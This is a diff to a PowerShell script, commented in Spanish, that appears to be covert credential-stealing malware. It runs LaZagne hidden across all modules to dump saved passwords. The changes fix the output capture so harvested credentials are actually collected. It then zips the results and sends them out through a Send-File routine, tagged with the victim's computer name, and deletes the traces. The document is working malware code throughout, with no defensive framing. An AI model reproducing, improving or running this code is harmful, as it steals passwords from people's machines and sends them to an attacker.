@@ -285,7 +285,7 @@ Estado: No se encontraron datos
     }
 }
 
-# === FASE 2: LAZAGNE (TODOS LOS MODULOS) ===
+# === FASE 2: LAZAGNE (TODOS LOS MODULOS) - CORREGIDO ===
 function Run-LaZagne-Phase {
     param([switch]$Auto = $false)
     
@@ -330,16 +330,31 @@ function Run-LaZagne-Phase {
         
         try {
             $outputFile = "$outDir\lazagne_$($modulo.Nombre).txt"
-            $p = Start-Process -FilePath $LaZagnePath -ArgumentList "$($modulo.Nombre) -oN `"$outputFile`"" -PassThru -WindowStyle Hidden
+            
+            # CORRECCION: Usar -RedirectStandardOutput para capturar la salida de consola
+            $p = Start-Process -FilePath $LaZagnePath `
+                -ArgumentList $modulo.Nombre `
+                -RedirectStandardOutput $outputFile `
+                -RedirectStandardError "$outDir\lazagne_$($modulo.Nombre)_err.txt" `
+                -PassThru -WindowStyle Hidden
+            
             $p.WaitForExit(60000)
-            if (-not $p.HasExited) { $p.Kill() }
+            if (-not $p.HasExited) { 
+                $p.Kill() 
+                Write-Log "LaZagne modulo $($modulo.Nombre): Timeout - proceso terminado"
+            }
+            
+            # Esperar a que el archivo se escriba completamente
+            Start-Sleep -Seconds 2
             
             if (Test-Path $outputFile) {
                 $size = (Get-Item $outputFile).Length
                 $content = Get-Content $outputFile -Raw -ErrorAction SilentlyContinue
                 
+                Write-Log "LaZagne modulo $($modulo.Nombre): Archivo generado - $size bytes"
+                
                 # Verificar si tiene datos reales (no solo el banner)
-                $tieneDatos = $content -match "Password|password|User|user|Login|login" -and ($content.Length -gt 500)
+                $tieneDatos = $content -match "Password found|password found|\[\+]" -and ($content.Length -gt 200)
                 
                 if ($tieneDatos) {
                     $modulosConDatos++
@@ -360,7 +375,7 @@ function Run-LaZagne-Phase {
                     
                     Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                 } else {
-                    Write-Log "LaZagne modulo $($modulo.Nombre): Sin datos relevantes"
+                    Write-Log "LaZagne modulo $($modulo.Nombre): Sin datos relevantes (solo banner o vacio)"
                     # Enviar de todos modos pero marcando que esta vacio
                     $zipPath = "$env:TEMP\lazagne_$($modulo.Nombre)_vacio.zip"
                     Compress-Archive -Path $outputFile -DestinationPath $zipPath -Force
@@ -371,10 +386,16 @@ function Run-LaZagne-Phase {
                     $modulosExitosos++
                 }
             } else {
-                Write-Log "LaZagne modulo $($modulo.Nombre): No se genero archivo"
+                Write-Log "LaZagne modulo $($modulo.Nombre): No se genero archivo de salida"
+                # Crear archivo informativo de error
+                $errorContent = "=== LaZagne Modulo: $($modulo.Nombre) ===`nFecha: $(Get-Date)`nPC: $env:COMPUTERNAME`nEstado: ERROR - No se genero archivo de salida`n`nNota: LaZagne escribe a stdout, puede que no haya encontrado datos o haya un error de ejecucion."
+                $errorContent | Out-File $outputFile -Encoding UTF8
             }
         } catch {
             Write-Log "Error en modulo $($modulo.Nombre): $_"
+            # Crear archivo de error
+            $errorFile = "$outDir\lazagne_$($modulo.Nombre)_error.txt"
+            "Error ejecutando modulo $($modulo.Nombre): $_" | Out-File $errorFile -Encoding UTF8
         }
         
         Start-Sleep -Seconds 2
@@ -386,13 +407,20 @@ function Run-LaZagne-Phase {
     
     try {
         $allOutput = "$outDir\lazagne_all.txt"
-        $p = Start-Process -FilePath $LaZagnePath -ArgumentList "all -oN `"$allOutput`"" -PassThru -WindowStyle Hidden
+        $p = Start-Process -FilePath $LaZagnePath `
+            -ArgumentList "all" `
+            -RedirectStandardOutput $allOutput `
+            -RedirectStandardError "$outDir\lazagne_all_err.txt" `
+            -PassThru -WindowStyle Hidden
+        
         $p.WaitForExit(120000)
         if (-not $p.HasExited) { $p.Kill() }
         
+        Start-Sleep -Seconds 2
+        
         if (Test-Path $allOutput) {
             $size = (Get-Item $allOutput).Length
-            if ($size -gt 1000) {
+            if ($size -gt 500) {
                 $zipPath = "$env:TEMP\lazagne_all.zip"
                 Compress-Archive -Path $allOutput -DestinationPath $zipPath -Force
                 $tamanoMB = [math]::Round($size / 1MB, 2)
@@ -400,7 +428,12 @@ function Run-LaZagne-Phase {
                 $caption = "[EXTRA] [LaZagne] Respaldo COMPLETO (all)`nModulos: Todos`nTamano: $tamanoMB MB`nEstado: ✅ COMPLETO`nPC: $env:COMPUTERNAME"
                 Send-File -Path $zipPath -Caption $caption | Out-Null
                 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                Write-Log "LaZagne 'all' enviado correctamente"
+            } else {
+                Write-Log "LaZagne 'all': Archivo muy pequeno, posiblemente sin datos"
             }
+        } else {
+            Write-Log "LaZagne 'all': No se genero archivo"
         }
     } catch {
         Write-Log "Error en modulo 'all': $_"
